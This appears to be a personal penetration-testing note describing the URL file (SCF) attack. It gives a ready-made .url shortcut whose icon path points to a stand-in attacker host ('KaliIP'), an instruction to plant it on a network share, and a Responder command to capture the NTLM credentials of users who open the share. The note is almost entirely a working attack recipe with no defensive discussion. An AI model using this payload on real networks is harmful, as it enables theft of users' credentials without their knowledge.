---
title: URL File Attack / SCF attack
updated: 2023-09-29 05:08:31Z
created: 2023-09-29 05:07:40Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# URL File Attack / SCF attack
1. Create file **@filename.url** 

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\KaliIP\%USERNAME%.icon
IconIndex=1
```

2. Copy file to network share
3. `responder -I eth0 -v`
